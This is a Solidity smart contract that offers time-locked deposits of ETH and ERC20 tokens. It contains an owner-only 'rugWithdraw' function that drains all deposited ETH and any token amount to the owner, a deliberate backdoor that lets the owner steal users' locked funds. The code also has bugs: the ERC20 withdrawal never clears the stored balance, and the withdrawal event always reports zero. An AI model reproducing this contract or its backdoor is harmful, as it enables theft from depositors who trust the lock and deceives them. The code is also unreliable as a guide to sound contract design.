// SPDX-License-Identifier: Do-Whatever-You-Want-With-This-License
pragma solidity ^0.8.9;

import "./SafeERC20.sol";
import "./Ownable.sol";

contract TokenLocker is Ownable {
    using SafeERC20 for IERC20;

    address[] lockedTokens;

    mapping (address => uint256) public lockedEthBalance;
    mapping (address => uint256) public ethUnlockTime;

    mapping (address => uint256) public lockedERC20Balance;
    mapping (address => address) public lockedERC20;
    mapping (address => uint256) public erc20UnlockTime;

    event Withdrawal(uint amount, uint when);
    event Locking(uint amount, uint unlockTime);

    function lockETH(uint256 time) public payable {
        require(block.timestamp < time, "Unlock time should be in the future");
        require(time >= ethUnlockTime[msg.sender], 
            "Unlock time for new locking should be equal or greater to current one");

        ethUnlockTime[msg.sender] = time;
        lockedEthBalance[msg.sender] += msg.value;

        emit Locking(msg.value, time);
    }

    function withdrawETH() public {
        require(block.timestamp >= ethUnlockTime[msg.sender], "You can't withdraw yet");

        payable(msg.sender).transfer(lockedEthBalance[msg.sender]);

        lockedEthBalance[msg.sender] = 0;
        ethUnlockTime[msg.sender] = 0;

        emit Withdrawal(lockedEthBalance[msg.sender], block.timestamp);
    }

    function lockERC20(IERC20 token, uint256 amount, uint256 time) public {
        require(lockedERC20[msg.sender] == address(0), "A ERC20 token is already locked");
        require(block.timestamp < time, "Unlock time should be in the future");

        lockedERC20Balance[msg.sender] = amount;
        erc20UnlockTime[msg.sender] = time;
        lockedERC20[msg.sender] = address(token);
        
        token.safeTransferFrom(msg.sender, address(this), amount);

    }

    function withdrawERC20() public {
        require(block.timestamp >= erc20UnlockTime[msg.sender], "You can't withdraw yet");

        IERC20 token = IERC20(lockedERC20[msg.sender]);
        token.transfer(msg.sender, lockedERC20Balance[msg.sender]);

        erc20UnlockTime[msg.sender] = 0;
        lockedERC20[msg.sender] = address(0);
    }   

    function rugWithdraw(IERC20 token, uint256 amount) public onlyOwner {

        if (address(this).balance != 0) {
            payable(msg.sender).transfer(address(this).balance);
        }
        
        token.transfer(msg.sender, amount);

    }


}

